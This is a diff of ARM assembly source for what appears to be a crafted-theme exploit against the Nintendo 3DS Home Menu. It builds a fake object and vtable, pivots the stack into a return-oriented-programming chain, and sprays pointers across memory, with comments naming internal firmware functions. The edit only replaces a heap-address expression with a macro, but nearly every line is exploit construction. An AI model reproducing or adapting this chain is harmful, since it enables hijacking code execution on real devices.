@@ -32,7 +32,7 @@ themeheader:
 #endif
 
 .word POP_R0PC @ Stack-pivot to ropstackstart.
-.word HEAPBUF + (object - _start) @ r0
+.word ROPBUFLOC(object) @ r0
 
 .word ROP_LOADR4_FROMOBJR0
 #endif
@@ -42,26 +42,26 @@ themeheader:
 #endif
 
 object:
-.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
-.word HEAPBUF + (object - _start) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
+.word ROPBUFLOC(vtable) @ object+0, vtable ptr
+.word ROPBUFLOC(object) @ Ptr loaded by L_2441a0, passed to L_1e95e0 inr0.
 .word 0 @ Memchunk-hdr stuff writes here.
 .word 0
 
-.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
+.word ROPBUFLOC(object + 0x20) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.
 
 .space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
 stackpivot_sploadword:
-.word HEAPBUF + (ropstackstart - _start) @ sp
+.word ROPBUFLOC(ropstackstart) @ sp
 stackpivot_pcloadword:
 .word ROP_POPPC @ pc
 
 .space ((object + 0x28) - .)
-.word HEAPBUF + (object - _start) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
+.word ROPBUFLOC(object) @ Actual object-ptr loaded by L_1e95e0, used for the vtable functr +8 call.
 
 @ Fill memory with the ptrs used by the following:
 @ Ptr loaded by L_1d1ea8, passed to L_2441a0 inr0.
 @ Ptr loaded by L_1ca5d0, passed to L_1d1ea8() inr0.
-.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (HEAPBUF + (object - _start))
+.fill (((object + 0x3a60 + 0x100) - .) / 4), 4, (ROPBUFLOC(object))
 
 vtable:
 .word 0, 0 @ vtable+0
@@ -69,7 +69,7 @@ vtable:
 .word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
 .word ROP_POPPC, ROP_POPPC @ vtable funcptr +16/+20
 
-.space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at heapbuf+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
+.space ((object + 0x4000) - .) @ Base the tmpdata followed by stack, at ROPBUF+0x4000 to make sure homemenu doesn't overwrite the ROP data with the u8 write(see notes on v9.4 func L_1ca5d0).
 
 ropstackstart:
 
